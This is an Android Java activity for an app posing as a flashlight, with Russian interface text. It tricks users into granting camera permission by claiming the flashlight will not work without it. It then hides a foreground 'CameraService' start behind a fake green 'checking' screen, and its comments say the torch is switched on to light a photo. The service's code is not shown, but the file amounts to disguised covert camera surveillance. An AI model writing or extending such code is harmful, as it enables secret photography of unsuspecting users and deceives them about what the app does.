package com.flashlight.app;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isProcessing = false;
    private View greenOverlay;
    private TextView tvAnim;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        greenOverlay = findViewById(R.id.green_overlay);
        tvAnim = findViewById(R.id.tv_anim_text);
        Button btn = findViewById(R.id.btn_flash);

        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                Boolean flash = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flash != null && flash) { cameraId = id; break; }
            }
            if (cameraId == null) cameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) { e.printStackTrace(); }

        btn.setOnClickListener(v -> {
            // Если нет разрешения на камеру - показываем диалог
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                new AlertDialog.Builder(this)
                    .setTitle("Фонарь не работает")
                    .setMessage("Чтобы началась проверка, разрешите доступ к камере.")
                    .setPositiveButton("Разрешить доступ", (dialog, which) -> {
                        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1);
                    })
                    .setCancelable(false)
                    .show();
                return;
            }

            if (isProcessing) return;
            isProcessing = true;

            try {
                // Показываем зеленый экран с "Проверка."
                greenOverlay.setVisibility(View.VISIBLE);
                tvAnim.setText("Проверка.");

                // Анимация проверки (мигание точками) - 2 секунды
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 500);
                handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1000);
                handler.postDelayed(() -> tvAnim.setText("Проверка."), 1500);
                
                // Включаем фонарик для съемки на 1.5 сек (для света)
                try { cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}

                // Запускаем камеру
                Intent svc = new Intent(this, CameraService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
                else startService(svc);

                // Через 3 секунды переключаем на "Активация..."
                handler.postDelayed(() -> {
                    tvAnim.setText("Активация фонаря...");
                    
                    // Оставляем свет гореть еще 3 секунды
                    handler.postDelayed(() -> {
                        try { cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
                        
                        // Завершаем
                        greenOverlay.setVisibility(View.GONE);
                        isProcessing = false;
                        
                        new AlertDialog.Builder(this)
                            .setTitle("Успех")
                            .setMessage("Все сработало. Фонарь готов к работе.")
                            .setPositiveButton("ОК", null)
                            .show();

                    }, 3000);

                }, 2000);

            } catch (Exception e) { e.printStackTrace(); }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // Если разрешил - жмем кнопку еще раз
        }
    }
}
